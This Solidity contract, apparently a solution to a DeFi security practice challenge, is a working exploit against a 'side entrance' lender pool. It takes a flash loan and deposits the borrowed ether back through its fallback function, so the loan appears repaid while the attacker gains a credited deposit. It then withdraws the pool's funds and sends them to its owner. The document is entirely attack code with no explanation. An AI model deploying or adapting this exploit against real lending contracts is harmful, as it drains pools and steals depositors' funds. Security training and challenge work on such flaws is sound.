// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import {console} from "../Console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance {
    address public owner;
    bool deposit = false;

    using Address for address payable;
    ISideEntranceLenderPool lenderPool;

    constructor(address _lenderPool){
        lenderPool = ISideEntranceLenderPool(_lenderPool);
        owner = msg.sender;
    }

    function attack(uint256 amount) public payable {
        console.log("Attack called : ",amount);
        deposit = true;
        lenderPool.flashLoan(amount) ;
        deposit = false;
        lenderPool.withdraw() ;
    }

    function withdraw() external payable {
        console.log("withdraw from attackContract [ ",msg.sender,"] : ",address(this).balance  );
        require(msg.sender==owner , "Only owner");
        payable(msg.sender).sendValue(address(this).balance);
    }

    fallback() external payable {
        console.log("Received ether : ",msg.value);
        if (deposit){
            lenderPool.deposit{value:msg.value}();
        }
    }

    receive() external payable{}
}